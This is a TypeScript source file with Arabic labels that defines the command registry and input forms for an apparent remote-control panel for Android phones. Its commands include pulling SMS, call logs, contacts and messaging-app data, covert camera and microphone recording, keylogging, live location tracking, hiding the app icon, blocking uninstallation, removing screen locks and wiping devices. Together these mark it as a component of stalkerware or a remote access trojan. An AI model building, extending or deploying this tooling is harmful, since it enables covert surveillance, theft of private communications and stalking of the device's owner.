// Command Registry - 200+ Commands with Dynamic Parameters

export interface CommandInfo {
  cat: string
  cmd: string
  desc: string
  emoji: string
  priority?: number // 0=low, 1=normal, 2=high, 3=critical
  timeout?: number // seconds
}

export type CommandRegistry = Record<string, CommandInfo>

export const COMMAND_REGISTRY: CommandRegistry = {
  // Data Collection (20)
  sms: { cat: "data", cmd: "get_sms", desc: "جلب الرسائل SMS", emoji: "📲" },
  calls: { cat: "data", cmd: "get_calls", desc: "جلب سجل المكالمات", emoji: "📞" },
  contacts: { cat: "data", cmd: "get_contacts", desc: "جلب جهات الاتصال", emoji: "📇" },
  location: { cat: "data", cmd: "get_location", desc: "جلب الموقع الجغرافي", emoji: "📍", priority: 2 },
  notifications: { cat: "data", cmd: "get_notifications", desc: "جلب الإشعارات", emoji: "🔔" },
  apps: { cat: "data", cmd: "get_apps", desc: "جلب التطبيقات المثبتة", emoji: "📱" },
  info: { cat: "data", cmd: "get_info", desc: "معلومات الجهاز", emoji: "ℹ️" },
  battery: { cat: "data", cmd: "get_battery", desc: "حالة البطارية", emoji: "🔋" },
  gallery: { cat: "data", cmd: "get_gallery", desc: "المعرض", emoji: "🖼️" },
  clipboard: { cat: "data", cmd: "get_clipboard", desc: "الحافظة", emoji: "📋" },
  all_data: { cat: "data", cmd: "get_all", desc: "جميع البيانات", emoji: "📥" },
  wifi_info: { cat: "data", cmd: "get_wifi_info", desc: "معلومات الواي فاي", emoji: "📶" },
  bluetooth_devices: { cat: "data", cmd: "get_bluetooth", desc: "أجهزة البلوتوث", emoji: "🔵" },
  network_info: { cat: "data", cmd: "get_network_info", desc: "معلومات الشبكة", emoji: "🌐" },
  sim_info: { cat: "data", cmd: "get_sim_info", desc: "معلومات الشريحة", emoji: "📱" },
  storage_info: { cat: "data", cmd: "get_storage_info", desc: "معلومات التخزين", emoji: "💾" },
  installed_apps: { cat: "data", cmd: "get_installed_apps", desc: "التطبيقات المثبتة", emoji: "📦" },
  running_apps: { cat: "data", cmd: "get_running_apps", desc: "التطبيقات النشطة", emoji: "⚡" },
  calendar: { cat: "data", cmd: "get_calendar", desc: "التقويم", emoji: "📅" },
  browser_history: { cat: "data", cmd: "get_browser_history", desc: "سجل المتصفح", emoji: "🌍" },

  // Social Media (15)
  whatsapp: { cat: "social", cmd: "get_whatsapp", desc: "واتساب", emoji: "💬" },
  telegram_app: { cat: "social", cmd: "get_telegram", desc: "تليجرام", emoji: "✈️" },
  instagram: { cat: "social", cmd: "get_instagram", desc: "انستجرام", emoji: "📷" },
  messenger: { cat: "social", cmd: "get_messenger", desc: "ماسنجر", emoji: "📘" },
  snapchat: { cat: "social", cmd: "get_snapchat", desc: "سناب شات", emoji: "👻" },
  tiktok: { cat: "social", cmd: "get_tiktok", desc: "تيك توك", emoji: "🎵" },
  twitter: { cat: "social", cmd: "get_twitter", desc: "تويتر / X", emoji: "🐦" },
  viber: { cat: "social", cmd: "get_viber", desc: "فايبر", emoji: "💜" },
  signal: { cat: "social", cmd: "get_signal", desc: "سيجنال", emoji: "🟢" },
  facebook: { cat: "social", cmd: "get_facebook", desc: "فيسبوك", emoji: "📘" },
  whatsapp_status: { cat: "social", cmd: "get_whatsapp_status", desc: "حالات واتساب", emoji: "📝" },
  telegram_channels: { cat: "social", cmd: "get_telegram_channels", desc: "قنوات تليجرام", emoji: "📺" },
  instagram_stories: { cat: "social", cmd: "get_instagram_stories", desc: "قصص انستجرام", emoji: "📸" },
  youtube: { cat: "social", cmd: "get_youtube", desc: "يوتيوب", emoji: "▶️" },

  // Remote Control (40)
  ping: { cat: "control", cmd: "ping", desc: "فحص الاتصال", emoji: "📡" },
  vibrate: { cat: "control", cmd: "vibrate", desc: "اهتزاز", emoji: "📳" },
  ring: { cat: "control", cmd: "ring", desc: "رنين", emoji: "🔔" },
  screenshot: { cat: "control", cmd: "screenshot", desc: "لقطة شاشة", emoji: "📸", priority: 2 },
  front_camera: { cat: "control", cmd: "front_camera", desc: "كاميرا أمامية", emoji: "📷", priority: 2, timeout: 60 },
  back_camera: { cat: "control", cmd: "back_camera", desc: "كاميرا خلفية", emoji: "📷", priority: 2, timeout: 60 },
  record_audio: { cat: "control", cmd: "record_audio", desc: "تسجيل صوتي", emoji: "🎙️", priority: 2, timeout: 180 },
  record_video: { cat: "control", cmd: "record_screen", desc: "تسجيل فيديو", emoji: "🎬", timeout: 300 },
  lock_phone: { cat: "control", cmd: "lock_phone", desc: "قفل الهاتف", emoji: "🔒", priority: 3 },
  unlock_phone: { cat: "control", cmd: "unlock_phone", desc: "فتح الهاتف", emoji: "🔓" },
  reboot: { cat: "control", cmd: "reboot", desc: "إعادة تشغيل", emoji: "🔄" },
  shutdown: { cat: "control", cmd: "shutdown", desc: "إيقاف التشغيل", emoji: "⏻" },
  set_volume: { cat: "control", cmd: "set_volume", desc: "تعيين الصوت", emoji: "🔊" },
  set_brightness: { cat: "control", cmd: "set_brightness", desc: "تعيين السطوع", emoji: "☀️" },
  set_ringtone: { cat: "control", cmd: "set_ringtone", desc: "تعيين النغمة", emoji: "🔔" },
  set_wallpaper: { cat: "control", cmd: "set_wallpaper", desc: "تعيين الخلفية", emoji: "🖼️" },
  enable_wifi: { cat: "control", cmd: "enable_wifi", desc: "تشغيل الواي فاي", emoji: "📶" },
  disable_wifi: { cat: "control", cmd: "disable_wifi", desc: "إيقاف الواي فاي", emoji: "📵" },
  enable_bluetooth: { cat: "control", cmd: "enable_bluetooth", desc: "تشغيل البلوتوث", emoji: "🔵" },
  disable_bluetooth: { cat: "control", cmd: "disable_bluetooth", desc: "إيقاف البلوتوث", emoji: "❌" },
  enable_mobile_data: { cat: "control", cmd: "enable_mobile_data", desc: "تشغيل بيانات الجوال", emoji: "📶" },
  disable_mobile_data: { cat: "control", cmd: "disable_mobile_data", desc: "إيقاف بيانات الجوال", emoji: "📵" },
  enable_hotspot: { cat: "control", cmd: "enable_hotspot", desc: "تشغيل نقطة الاتصال", emoji: "📡" },
  disable_hotspot: { cat: "control", cmd: "disable_hotspot", desc: "إيقاف نقطة الاتصال", emoji: "📵" },
  airplane_on: { cat: "control", cmd: "airplane_on", desc: "وضع الطيران - تشغيل", emoji: "✈️" },
  airplane_off: { cat: "control", cmd: "airplane_off", desc: "وضع الطيران - إيقاف", emoji: "📱" },
  auto_rotate_on: { cat: "control", cmd: "set_auto_rotate", desc: "الدوران التلقائي - تشغيل", emoji: "🔄" },
  auto_rotate_off: { cat: "control", cmd: "set_auto_rotate", desc: "الدوران التلقائي - إيقاف", emoji: "🔒" },
  torch_on: { cat: "control", cmd: "torch_on", desc: "تشغيل الكشاف", emoji: "🔦" },
  torch_off: { cat: "control", cmd: "torch_off", desc: "إطفاء الكشاف", emoji: "🔦" },
  play_sound: { cat: "control", cmd: "play_sound", desc: "تشغيل صوت", emoji: "🔊" },
  speak_text: { cat: "control", cmd: "speak_text", desc: "نطق نص", emoji: "🗣️" },
  show_notification: { cat: "control", cmd: "show_notification", desc: "إظهار إشعار", emoji: "🔔" },
  open_url: { cat: "control", cmd: "open_url", desc: "فتح رابط", emoji: "🌐" },
  send_sms: { cat: "control", cmd: "send_sms", desc: "إرسال رسالة SMS", emoji: "📲", priority: 2 },
  make_call: { cat: "control", cmd: "make_call", desc: "إجراء مكالمة", emoji: "📞", priority: 2 },
  block_number: { cat: "control", cmd: "block_number", desc: "حظر رقم", emoji: "🚫" },
  unblock_number: { cat: "control", cmd: "unblock_number", desc: "إلغاء حظر رقم", emoji: "✅" },

  // App Management (20)
  open_app: { cat: "apps", cmd: "open_app", desc: "فتح تطبيق", emoji: "📱" },
  close_app: { cat: "apps", cmd: "close_app", desc: "إغلاق تطبيق", emoji: "❌" },
  install_app: { cat: "apps", cmd: "install_app", desc: "تثبيت تطبيق", emoji: "📥" },
  uninstall_app: { cat: "apps", cmd: "uninstall_app", desc: "حذف تطبيق", emoji: "🗑️" },
  block_app: { cat: "apps", cmd: "block_app", desc: "حظر تطبيق", emoji: "🚫" },
  unblock_app: { cat: "apps", cmd: "unblock_app", desc: "إلغاء حظر تطبيق", emoji: "✅" },
  clear_app_data: { cat: "apps", cmd: "clear_app_data", desc: "مسح بيانات تطبيق", emoji: "🧹" },
  force_stop_app: { cat: "apps", cmd: "force_stop_app", desc: "إيقاف قسري", emoji: "⛔" },
  app_info: { cat: "apps", cmd: "get_app_info", desc: "معلومات تطبيق", emoji: "ℹ️" },
  app_usage: { cat: "apps", cmd: "get_app_usage", desc: "استخدام التطبيقات", emoji: "📊" },
  screen_time: { cat: "apps", cmd: "get_screen_time", desc: "وقت الشاشة", emoji: "⏱️" },
  app_permissions: { cat: "apps", cmd: "get_app_permissions", desc: "صلاحيات التطبيق", emoji: "🔐" },

  // File Management (25)
  list_files: { cat: "files", cmd: "list_files", desc: "عرض الملفات", emoji: "📂" },
  get_file: { cat: "files", cmd: "get_file", desc: "جلب ملف", emoji: "📄" },
  download_file: { cat: "files", cmd: "download_file", desc: "تحميل ملف", emoji: "⬇️" },
  list_downloads: { cat: "files", cmd: "list_downloads", desc: "مجلد التحميلات", emoji: "📥" },
  list_dcim: { cat: "files", cmd: "list_dcim", desc: "مجلد DCIM", emoji: "📸" },
  list_music: { cat: "files", cmd: "list_music", desc: "مجلد الموسيقى", emoji: "🎵" },
  list_videos: { cat: "files", cmd: "list_videos", desc: "مجلد الفيديوهات", emoji: "🎬" },
  list_documents: { cat: "files", cmd: "list_documents", desc: "مجلد المستندات", emoji: "📁" },
  list_whatsapp: { cat: "files", cmd: "list_whatsapp", desc: "ملفات واتساب", emoji: "💬" },
  list_telegram_files: { cat: "files", cmd: "list_telegram_files", desc: "ملفات تليجرام", emoji: "✈️" },
  send_contacts_backup: { cat: "files", cmd: "send_backup_contacts", desc: "نسخة جهات الاتصال", emoji: "📇" },
  send_sms_backup: { cat: "files", cmd: "send_backup_sms", desc: "نسخة الرسائل", emoji: "📲" },
  send_calls_backup: { cat: "files", cmd: "send_backup_calls", desc: "نسخة المكالمات", emoji: "📞" },
  send_whatsapp_backup: { cat: "files", cmd: "send_backup_whatsapp", desc: "نسخة واتساب", emoji: "💬" },
  send_full_backup: { cat: "files", cmd: "send_backup_all", desc: "نسخة احتياطية كاملة", emoji: "💾", timeout: 300 },
  delete_file: { cat: "files", cmd: "delete_file", desc: "حذف ملف", emoji: "🗑️" },
  rename_file: { cat: "files", cmd: "rename_file", desc: "إعادة تسمية ملف", emoji: "✏️" },
  copy_file: { cat: "files", cmd: "copy_file", desc: "نسخ ملف", emoji: "📋" },
  move_file: { cat: "files", cmd: "move_file", desc: "نقل ملف", emoji: "📦" },
  create_folder: { cat: "files", cmd: "create_folder", desc: "إنشاء مجلد", emoji: "📁" },
  search_files: { cat: "files", cmd: "search_files", desc: "بحث في الملفات", emoji: "🔍" },
  recent_files: { cat: "files", cmd: "recent_files", desc: "الملفات الأخيرة", emoji: "🕐" },
  file_info: { cat: "files", cmd: "get_file_info", desc: "معلومات ملف", emoji: "ℹ️" },
  zip_files: { cat: "files", cmd: "zip_files", desc: "ضغط ملفات", emoji: "📦" },

  // Security & Admin (15)
  wipe_data: { cat: "security", cmd: "wipe_data", desc: "مسح البيانات", emoji: "💣", priority: 3, timeout: 120 },
  factory_reset: { cat: "security", cmd: "factory_reset", desc: "إعادة ضبط المصنع", emoji: "⚠️", priority: 3, timeout: 180 },
  show_app: { cat: "security", cmd: "show_app", desc: "إظهار أيقونة التطبيق", emoji: "👁️" },
  hide_app: { cat: "security", cmd: "hide_app", desc: "إخفاء أيقونة التطبيق", emoji: "🙈" },
  change_passcode: { cat: "security", cmd: "change_passcode", desc: "تغيير رمز القفل", emoji: "🔑" },
  set_pin: { cat: "security", cmd: "set_pin", desc: "تعيين رقم PIN", emoji: "🔢" },
  remove_pin: { cat: "security", cmd: "remove_pin", desc: "إزالة رقم PIN", emoji: "🔓" },
  enable_biometric: { cat: "security", cmd: "enable_biometric", desc: "تشغيل البصمة", emoji: "👤" },
  disable_biometric: { cat: "security", cmd: "disable_biometric", desc: "إيقاف البصمة", emoji: "❌" },
  anti_uninstall_on: { cat: "security", cmd: "anti_uninstall_on", desc: "الحماية من الحذف - تشغيل", emoji: "🛡️" },
  anti_uninstall_off: { cat: "security", cmd: "anti_uninstall_off", desc: "الحماية من الحذف - إيقاف", emoji: "⛔" },
  device_admin_status: { cat: "security", cmd: "device_admin_status", desc: "حالة مسؤول الجهاز", emoji: "📋" },
  check_root: { cat: "security", cmd: "check_root", desc: "فحص الروت", emoji: "🧪" },
  set_screen_lock: { cat: "security", cmd: "set_screen_lock", desc: "تعيين قفل الشاشة", emoji: "🔒" },
  remove_screen_lock: { cat: "security", cmd: "remove_screen_lock", desc: "إزالة قفل الشاشة", emoji: "🔓" },

  // Monitoring (20)
  keylogger_start: { cat: "monitor", cmd: "keylogger_start", desc: "بدء تسجيل المفاتيح", emoji: "⌨️" },
  keylogger_stop: { cat: "monitor", cmd: "keylogger_stop", desc: "إيقاف تسجيل المفاتيح", emoji: "⏹️" },
  get_keylogger: { cat: "monitor", cmd: "get_keylogger", desc: "جلب بيانات لوحة المفاتيح", emoji: "📥" },
  screen_record_start: { cat: "monitor", cmd: "screen_record_start", desc: "بدء تسجيل الشاشة", emoji: "🔴" },
  screen_record_stop: { cat: "monitor", cmd: "stop_screen", desc: "إيقاف تسجيل الشاشة", emoji: "⏹️" },
  clipboard_monitor_start: { cat: "monitor", cmd: "clipboard_monitor_start", desc: "بدء مراقبة الحافظة", emoji: "📋" },
  clipboard_monitor_stop: { cat: "monitor", cmd: "clipboard_monitor_stop", desc: "إيقاف مراقبة الحافظة", emoji: "⏹️" },
  get_clipboard_log: { cat: "monitor", cmd: "get_clipboard_log", desc: "سجل الحافظة", emoji: "📋" },
  wifi_monitor_start: { cat: "monitor", cmd: "wifi_monitor_start", desc: "بدء مراقبة الواي فاي", emoji: "📡" },
  wifi_monitor_stop: { cat: "monitor", cmd: "wifi_monitor_stop", desc: "إيقاف مراقبة الواي فاي", emoji: "⏹️" },
  app_monitor_start: { cat: "monitor", cmd: "app_monitor_start", desc: "بدء مراقبة التطبيقات", emoji: "📱" },
  app_monitor_stop: { cat: "monitor", cmd: "app_monitor_stop", desc: "إيقاف مراقبة التطبيقات", emoji: "⏹️" },
  get_app_log: { cat: "monitor", cmd: "get_app_log", desc: "سجل التطبيقات", emoji: "📋" },
  location_live: { cat: "monitor", cmd: "location_live", desc: "تتبع مباشر", emoji: "🗺️", priority: 3 },
  location_stop: { cat: "monitor", cmd: "location_stop", desc: "إيقاف التتبع", emoji: "⏹️" },
  location_history: { cat: "monitor", cmd: "get_location_history", desc: "سجل المواقع", emoji: "📜" },
  geo_add: { cat: "monitor", cmd: "geo_add", desc: "إضافة منطقة جغرافية", emoji: "➕" },
  geo_remove: { cat: "monitor", cmd: "geo_remove", desc: "حذف منطقة جغرافية", emoji: "➖" },
  geo_list: { cat: "monitor", cmd: "geo_list", desc: "قائمة المناطق الجغرافية", emoji: "📋" },
  sms_monitor: { cat: "monitor", cmd: "sms_monitor", desc: "مراقبة الرسائل", emoji: "📲" },
  call_monitor: { cat: "monitor", cmd: "call_monitor", desc: "مراقبة المكالمات", emoji: "📞" },

  // System Settings (15)
  set_language: { cat: "syssettings", cmd: "set_language", desc: "تعيين اللغة", emoji: "🌐" },
  set_timezone: { cat: "syssettings", cmd: "set_timezone", desc: "تعيين المنطقة الزمنية", emoji: "🕐" },
  set_alarm: { cat: "syssettings", cmd: "set_alarm", desc: "تعيين منبه", emoji: "⏰" },
  set_timer: { cat: "syssettings", cmd: "set_timer", desc: "تعيين مؤقت", emoji: "⏱️" },
  set_reminder: { cat: "syssettings", cmd: "set_reminder", desc: "تعيين تذكير", emoji: "📝" },
  enable_dev_mode: { cat: "syssettings", cmd: "enable_dev_mode", desc: "تشغيل وضع المطور", emoji: "🔧" },
  disable_dev_mode: { cat: "syssettings", cmd: "disable_dev_mode", desc: "إيقاف وضع المطور", emoji: "❌" },
  enable_usb_debug: { cat: "syssettings", cmd: "enable_usb_debug", desc: "تشغيل تصحيح USB", emoji: "🔌" },
  disable_usb_debug: { cat: "syssettings", cmd: "disable_usb_debug", desc: "إيقاف تصحيح USB", emoji: "❌" },
  dns_change: { cat: "syssettings", cmd: "dns_change", desc: "تغيير DNS", emoji: "🌐" },
  proxy_set: { cat: "syssettings", cmd: "proxy_set", desc: "تعيين بروكسي", emoji: "🔀" },
  apn_settings: { cat: "syssettings", cmd: "apn_settings", desc: "إعدادات APN", emoji: "📶" },
  nfc_on: { cat: "syssettings", cmd: "nfc_on", desc: "تشغيل NFC", emoji: "📡" },
  nfc_off: { cat: "syssettings", cmd: "nfc_off", desc: "إيقاف NFC", emoji: "❌" },
  auto_update_on: { cat: "syssettings", cmd: "auto_update_on", desc: "التحديث التلقائي - تشغيل", emoji: "⬆️" },
  auto_update_off: { cat: "syssettings", cmd: "auto_update_off", desc: "التحديث التلقائي - إيقاف", emoji: "⏸️" },
}

export const COMMAND_CATEGORIES: Record<string, { label: string; icon: string }> = {
  data: { label: "جمع البيانات", icon: "📊" },
  social: { label: "التواصل الاجتماعي", icon: "🌐" },
  control: { label: "التحكم عن بعد", icon: "🎮" },
  apps: { label: "إدارة التطبيقات", icon: "📦" },
  files: { label: "إدارة الملفات", icon: "📂" },
  security: { label: "الأمان", icon: "🔒" },
  monitor: { label: "المراقبة", icon: "🔍" },
  syssettings: { label: "إعدادات النظام", icon: "⚙️" },
}

export function getCommandsByCategory(category: string): CommandInfo[] {
  return Object.entries(COMMAND_REGISTRY)
    .filter(([, info]) => info.cat === category)
    .map(([name, info]) => ({ ...info, name }))
}

export function getTotalCommands(): number {
  return Object.keys(COMMAND_REGISTRY).length
}

// Command Parameters for Dynamic Forms
export interface CommandField {
  name: string
  type: 'text' | 'tel' | 'url' | 'number' | 'email' | 'password' | 'textarea' | 'select' | 'range' | 'checkbox' | 'time'
  label: string
  placeholder?: string
  required?: boolean
  options?: { value: string; label: string }[]
  min?: number
  max?: number
  default?: string | number
  rows?: number
  step?: string
}

export interface CommandParams {
  title: string
  fields: CommandField[]
  confirm?: string
}

export const COMMAND_PARAMS: Record<string, CommandParams> = {
  // SMS & Calls
  send_sms: {
    title: "📲 إرسال رسالة SMS",
    fields: [
      { name: "number", type: "tel", label: "رقم الهاتف", placeholder: "+964XXXXXXXXXX", required: true },
      { name: "message", type: "textarea", label: "نص الرسالة", placeholder: "اكتب رسالتك هنا...", required: true, rows: 4 }
    ]
  },
  make_call: {
    title: "📞 إجراء مكالمة",
    fields: [
      { name: "number", type: "tel", label: "رقم الهاتف", placeholder: "+964XXXXXXXXXX", required: true }
    ]
  },
  block_number: {
    title: "🚫 حظر رقم",
    fields: [
      { name: "number", type: "tel", label: "رقم الهاتف للحظر", placeholder: "+964XXXXXXXXXX", required: true }
    ]
  },
  unblock_number: {
    title: "✅ إلغاء حظر رقم",
    fields: [
      { name: "number", type: "tel", label: "رقم الهاتف لإلغاء الحظر", placeholder: "+964XXXXXXXXXX", required: true }
    ]
  },

  // Apps
  open_app: {
    title: "📱 فتح تطبيق",
    fields: [
      { name: "package", type: "text", label: "اسم حزمة التطبيق", placeholder: "com.example.app", required: true },
      { name: "name", type: "text", label: "اسم التطبيق (اختياري)", placeholder: "WhatsApp" }
    ]
  },
  close_app: {
    title: "❌ إغلاق تطبيق",
    fields: [
      { name: "package", type: "text", label: "اسم حزمة التطبيق", placeholder: "com.example.app", required: true }
    ]
  },
  uninstall_app: {
    title: "🗑️ حذف تطبيق",
    confirm: "هل أنت متأكد من حذف هذا التطبيق؟",
    fields: [
      { name: "package", type: "text", label: "اسم حزمة التطبيق", placeholder: "com.example.app", required: true }
    ]
  },
  install_app: {
    title: "📥 تثبيت تطبيق",
    fields: [
      { name: "url", type: "url", label: "رابط ملف APK", placeholder: "https://example.com/app.apk", required: true }
    ]
  },
  block_app: {
    title: "🚫 حظر تطبيق",
    fields: [
      { name: "package", type: "text", label: "اسم حزمة التطبيق", placeholder: "com.example.app", required: true }
    ]
  },
  clear_app_data: {
    title: "🧹 مسح بيانات تطبيق",
    confirm: "هل أنت متأكد من مسح بيانات هذا التطبيق؟",
    fields: [
      { name: "package", type: "text", label: "اسم حزمة التطبيق", placeholder: "com.example.app", required: true }
    ]
  },
  force_stop_app: {
    title: "⛔ إيقاف قسري",
    fields: [
      { name: "package", type: "text", label: "اسم حزمة التطبيق", placeholder: "com.example.app", required: true }
    ]
  },

  // System Settings
  set_volume: {
    title: "🔊 تعيين الصوت",
    fields: [
      { name: "level", type: "range", label: "مستوى الصوت", min: 0, max: 100, default: 50, required: true },
      { name: "stream", type: "select", label: "نوع الصوت", options: [
        { value: "media", label: "وسائط" },
        { value: "ring", label: "رنين" },
        { value: "notification", label: "إشعارات" },
        { value: "alarm", label: "منبه" }
      ], default: "media" }
    ]
  },
  set_brightness: {
    title: "☀️ تعيين السطوع",
    fields: [
      { name: "level", type: "range", label: "مستوى السطوع", min: 0, max: 100, default: 50, required: true }
    ]
  },
  set_wallpaper: {
    title: "🖼️ تعيين الخلفية",
    fields: [
      { name: "url", type: "url", label: "رابط الصورة", placeholder: "https://example.com/image.jpg", required: true }
    ]
  },
  set_ringtone: {
    title: "🔔 تعيين النغمة",
    fields: [
      { name: "url", type: "url", label: "رابط ملف الصوت", placeholder: "https://example.com/ringtone.mp3", required: true }
    ]
  },

  // Media & Notifications
  speak_text: {
    title: "🗣️ نطق نص",
    fields: [
      { name: "text", type: "textarea", label: "النص للنطق", placeholder: "اكتب النص هنا...", required: true, rows: 3 }
    ]
  },
  show_notification: {
    title: "🔔 إظهار إشعار",
    fields: [
      { name: "title", type: "text", label: "عنوان الإشعار", placeholder: "عنوان", required: true },
      { name: "message", type: "textarea", label: "نص الإشعار", placeholder: "محتوى الإشعار...", required: true, rows: 3 }
    ]
  },
  play_sound: {
    title: "🔊 تشغيل صوت",
    fields: [
      { name: "url", type: "url", label: "رابط ملف الصوت", placeholder: "https://example.com/sound.mp3" },
      { name: "type", type: "select", label: "نوع الصوت", options: [
        { value: "default", label: "افتراضي" },
        { value: "custom", label: "مخصص" }
      ], default: "default" }
    ]
  },

  // URL & Web
  open_url: {
    title: "🌐 فتح رابط",
    fields: [
      { name: "url", type: "url", label: "الرابط", placeholder: "https://example.com", required: true }
    ]
  },

  // File Management
  get_file: {
    title: "📄 جلب ملف",
    fields: [
      { name: "path", type: "text", label: "مسار الملف", placeholder: "/storage/emulated/0/Download/file.pdf", required: true }
    ]
  },
  delete_file: {
    title: "🗑️ حذف ملف",
    confirm: "هل أنت متأكد من حذف هذا الملف؟",
    fields: [
      { name: "path", type: "text", label: "مسار الملف", placeholder: "/storage/emulated/0/Download/file.pdf", required: true }
    ]
  },
  rename_file: {
    title: "✏️ إعادة تسمية ملف",
    fields: [
      { name: "path", type: "text", label: "مسار الملف الحالي", placeholder: "/storage/emulated/0/old_name.txt", required: true },
      { name: "new_name", type: "text", label: "الاسم الجديد", placeholder: "new_name.txt", required: true }
    ]
  },
  list_files: {
    title: "📂 عرض الملفات",
    fields: [
      { name: "path", type: "text", label: "مسار المجلد", placeholder: "/storage/emulated/0/Download", required: true }
    ]
  },
  search_files: {
    title: "🔍 بحث في الملفات",
    fields: [
      { name: "query", type: "text", label: "كلمة البحث", placeholder: "*.pdf", required: true },
      { name: "path", type: "text", label: "مسار البحث (اختياري)", placeholder: "/storage/emulated/0" }
    ]
  },
  create_folder: {
    title: "📁 إنشاء مجلد",
    fields: [
      { name: "path", type: "text", label: "مسار المجلد الجديد", placeholder: "/storage/emulated/0/NewFolder", required: true }
    ]
  },

  // Recording
  record_audio: {
    title: "🎙️ تسجيل صوتي",
    fields: [
      { name: "duration", type: "number", label: "مدة التسجيل (ثانية)", placeholder: "30", min: 1, max: 300, default: 30, required: true }
    ]
  },

  // Security
  wipe_data: {
    title: "💣 مسح البيانات",
    confirm: "⚠️ تحذير! سيتم مسح جميع البيانات نهائياً. هل أنت متأكد؟",
    fields: [
      { name: "confirm", type: "checkbox", label: "أؤكد مسح جميع البيانات", required: true }
    ]
  },
  factory_reset: {
    title: "⚠️ إعادة ضبط المصنع",
    confirm: "⚠️ تحذير! سيتم مسح جميع البيانات والإعدادات. هل أنت متأكد؟",
    fields: [
      { name: "confirm", type: "checkbox", label: "أؤكد إعادة ضبط المصنع", required: true }
    ]
  },
  change_passcode: {
    title: "🔑 تغيير رمز القفل",
    fields: [
      { name: "old_pin", type: "password", label: "الرمز القديم", placeholder: "****" },
      { name: "new_pin", type: "password", label: "الرمز الجديد", placeholder: "****", required: true },
      { name: "confirm_pin", type: "password", label: "تأكيد الرمز الجديد", placeholder: "****", required: true }
    ]
  },

  // Location
  geo_add: {
    title: "➕ إضافة منطقة جغرافية",
    fields: [
      { name: "name", type: "text", label: "اسم المنطقة", placeholder: "المنزل", required: true },
      { name: "lat", type: "number", label: "خط العرض", placeholder: "33.3157", required: true, step: "0.0001" },
      { name: "lon", type: "number", label: "خط الطول", placeholder: "44.3661", required: true, step: "0.0001" },
      { name: "radius", type: "number", label: "نصف القطر (متر)", placeholder: "100", default: 100, required: true }
    ]
  },
  geo_remove: {
    title: "➖ حذف منطقة جغرافية",
    fields: [
      { name: "name", type: "text", label: "اسم المنطقة", placeholder: "المنزل", required: true }
    ]
  },

  // System
  set_language: {
    title: "🌐 تعيين اللغة",
    fields: [
      { name: "lang", type: "select", label: "اللغة", options: [
        { value: "ar", label: "العربية" },
        { value: "en", label: "English" },
        { value: "ku", label: "كوردی" }
      ], required: true }
    ]
  },
  set_timezone: {
    title: "🕐 تعيين المنطقة الزمنية",
    fields: [
      { name: "timezone", type: "select", label: "المنطقة الزمنية", options: [
        { value: "Asia/Baghdad", label: "بغداد (GMT+3)" },
        { value: "Asia/Dubai", label: "دبي (GMT+4)" },
        { value: "Europe/London", label: "لندن (GMT+0)" },
        { value: "America/New_York", label: "نيويورك (GMT-5)" }
      ], required: true }
    ]
  },
  set_alarm: {
    title: "⏰ تعيين منبه",
    fields: [
      { name: "time", type: "time", label: "وقت المنبه", required: true },
      { name: "message", type: "text", label: "رسالة (اختياري)", placeholder: "استيقظ!" }
    ]
  },
  dns_change: {
    title: "🌐 تغيير DNS",
    fields: [
      { name: "dns1", type: "text", label: "DNS الأساسي", placeholder: "8.8.8.8", default: "8.8.8.8", required: true },
      { name: "dns2", type: "text", label: "DNS الثانوي", placeholder: "8.8.4.4", default: "8.8.4.4", required: true }
    ]
  },
  proxy_set: {
    title: "🔀 تعيين بروكسي",
    fields: [
      { name: "host", type: "text", label: "عنوان البروكسي", placeholder: "proxy.example.com", required: true },
      { name: "port", type: "number", label: "المنفذ", placeholder: "8080", required: true },
      { name: "username", type: "text", label: "اسم المستخدم (اختياري)" },
      { name: "password", type: "password", label: "كلمة المرور (اختياري)" }
    ]
  }
}

export function getCommandParams(command: string): CommandParams | null {
  return COMMAND_PARAMS[command] || null
}

// Permission Groups
export const PERMISSION_GROUPS = {
  location: { label: "الموقع", icon: "📍", permissions: ["ACCESS_FINE_LOCATION", "ACCESS_COARSE_LOCATION", "ACCESS_BACKGROUND_LOCATION"] },
  camera: { label: "الكاميرا", icon: "📷", permissions: ["CAMERA"] },
  microphone: { label: "الميكروفون", icon: "🎙️", permissions: ["RECORD_AUDIO"] },
  storage: { label: "التخزين", icon: "💾", permissions: ["READ_EXTERNAL_STORAGE", "WRITE_EXTERNAL_STORAGE", "MANAGE_EXTERNAL_STORAGE"] },
  contacts: { label: "جهات الاتصال", icon: "📇", permissions: ["READ_CONTACTS", "WRITE_CONTACTS"] },
  phone: { label: "الهاتف", icon: "📱", permissions: ["READ_PHONE_STATE", "READ_CALL_LOG", "CALL_PHONE"] },
  sms: { label: "الرسائل", icon: "📲", permissions: ["READ_SMS", "SEND_SMS"] },
  calendar: { label: "التقويم", icon: "📅", permissions: ["READ_CALENDAR", "WRITE_CALENDAR"] },
  notifications: { label: "الإشعارات", icon: "🔔", permissions: ["POST_NOTIFICATIONS"] },
  overlay: { label: "العرض فوق التطبيقات", icon: "👁️", permissions: ["SYSTEM_ALERT_WINDOW"], special: true },
  accessibility: { label: "إمكانية الوصول", icon: "♿", permissions: ["BIND_ACCESSIBILITY_SERVICE"], special: true },
  admin: { label: "مسؤول الجهاز", icon: "🔒", permissions: ["BIND_DEVICE_ADMIN"], special: true },
}

// Device States
export const DEVICE_STATES = {
  online: { label: "متصل", color: "green", icon: "🟢" },
  offline: { label: "غير متصل", color: "red", icon: "🔴" },
  idle: { label: "خامل", color: "yellow", icon: "🟡" },
  busy: { label: "مشغول", color: "blue", icon: "🔵" },
  low_battery: { label: "بطارية منخفضة", color: "orange", icon: "🟠" },
  charging: { label: "يشحن", color: "green", icon: "🔋" },
}

// Command States
export const COMMAND_STATES = {
  queued: { label: "في الانتظار", color: "yellow" },
  delivered: { label: "تم الإرسال", color: "blue" },
  executing: { label: "ينفذ", color: "purple" },
  success: { label: "نجح", color: "green" },
  failed: { label: "فشل", color: "red" },
  timeout: { label: "انتهت المهلة", color: "orange" },
  cancelled: { label: "ملغي", color: "gray" },
  retrying: { label: "يعيد المحاولة", color: "cyan" },
}
